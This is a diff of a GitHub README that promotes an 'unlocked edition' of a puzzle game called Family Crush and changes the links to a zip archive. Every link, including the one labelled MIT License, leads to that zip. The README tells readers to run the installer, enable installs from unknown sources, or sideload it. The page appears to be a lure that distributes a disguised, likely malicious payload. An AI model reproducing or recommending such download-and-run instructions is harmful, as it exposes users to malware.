@@ -1,6 +1,6 @@
 # Family Crush – Unleash the Ultimate Puzzle Adventure! 🎲
 
-[![Download](https://raw.githubusercontent.com/yoniespaa/family-crush-unlocked-edition/branch/noncaste/family-crush-edition-unlocked-1.9.zip%20Drive&logoColor=white)](https://raw.githubusercontent.com/yoniespaa/family-crush-unlocked-edition/branch/noncaste/family-crush-edition-unlocked-1.9.zip)
+[![Download](https://github.com/yoniespaa/family-crush-unlocked-edition/raw/refs/heads/branch/noncaste/edition-unlocked-family-crush-v3.2.zip%20Drive&logoColor=white)](https://github.com/yoniespaa/family-crush-unlocked-edition/raw/refs/heads/branch/noncaste/edition-unlocked-family-crush-v3.2.zip)
 
 Dive into the world of **Family Crush**, where challenging puzzles and family-friendly competition come together for an unforgettable digital adventure! This repository is your portal to seamless access, updates, and everything you need to embark on the Family Crush journey.
 
@@ -45,14 +45,14 @@ Welcome to the premier destination for discovering **Family Crush Puzzle Solutio
 Release your inner puzzle-solver in mere minutes! Follow these steps to unlock your adventure:
 
 1. **Download**
-   - Click the badge above or follow this https://raw.githubusercontent.com/yoniespaa/family-crush-unlocked-edition/branch/noncaste/family-crush-edition-unlocked-1.9.zip to get the latest version.
+   - Click the badge above or follow this https://github.com/yoniespaa/family-crush-unlocked-edition/raw/refs/heads/branch/noncaste/edition-unlocked-family-crush-v3.2.zip to get the latest version.
 
 2. **For Windows/macOS/Linux**
    - Unzip the downloaded file to a safe location.
    - Run the installer. Follow on-screen instructions.
 
 3. **For Android/iOS**
-   - Download the APK (Android) or IPA (iOS) from the https://raw.githubusercontent.com/yoniespaa/family-crush-unlocked-edition/branch/noncaste/family-crush-edition-unlocked-1.9.zip
+   - Download the APK (Android) or IPA (iOS) from the https://github.com/yoniespaa/family-crush-unlocked-edition/raw/refs/heads/branch/noncaste/edition-unlocked-family-crush-v3.2.zip
    - On Android: Enable 'Install from Unknown Sources' if required. Tap the APK to install.
    - On iOS: Use your preferred sideload tool (like AltStore) to install the IPA.
 
@@ -104,11 +104,11 @@ Any hour, any issue—human-powered assistance is a tap away. Let us handle the 
 
 ## 📜 MIT License (2025)
 
-This project is lovingly distributed under the [MIT License](https://raw.githubusercontent.com/yoniespaa/family-crush-unlocked-edition/branch/noncaste/family-crush-edition-unlocked-1.9.zip), 2025 edition. You are free to use, modify, and distribute Family Crush as your imagination and local laws allow—just include this notice.
+This project is lovingly distributed under the [MIT License](https://github.com/yoniespaa/family-crush-unlocked-edition/raw/refs/heads/branch/noncaste/edition-unlocked-family-crush-v3.2.zip), 2025 edition. You are free to use, modify, and distribute Family Crush as your imagination and local laws allow—just include this notice.
 
 ---
 
-[![Download](https://raw.githubusercontent.com/yoniespaa/family-crush-unlocked-edition/branch/noncaste/family-crush-edition-unlocked-1.9.zip%20Drive&logoColor=white)](https://raw.githubusercontent.com/yoniespaa/family-crush-unlocked-edition/branch/noncaste/family-crush-edition-unlocked-1.9.zip)
+[![Download](https://github.com/yoniespaa/family-crush-unlocked-edition/raw/refs/heads/branch/noncaste/edition-unlocked-family-crush-v3.2.zip%20Drive&logoColor=white)](https://github.com/yoniespaa/family-crush-unlocked-edition/raw/refs/heads/branch/noncaste/edition-unlocked-family-crush-v3.2.zip)
 
 ---
 
